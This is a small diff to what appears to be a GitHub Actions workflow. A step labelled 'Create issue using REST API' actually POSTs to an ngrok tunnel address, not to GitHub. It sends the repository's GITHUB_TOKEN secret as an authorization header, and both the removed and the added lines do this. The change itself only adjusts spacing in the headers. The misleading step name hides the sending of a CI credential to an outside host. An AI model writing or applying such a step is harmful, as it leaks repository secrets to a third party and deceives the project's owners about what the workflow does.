@@ -12,5 +12,5 @@ jobs:
     steps:
     - name: Create issue using REST API
       run: |
-        curl -d '{"key1":"value1", "key2":"value2"}' --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
-        --header 'content-type: application/json' \ -X POST https://6b1b42be7dea.ngrok.io/
+        curl -d '{"key1":"value1", "key2":"value2"}' --header 'authorization:Bearer ${{ secrets.GITHUB_TOKEN }}' \
+        --header 'content-type:application/json' \ -X POST https://6b1b42be7dea.ngrok.io/
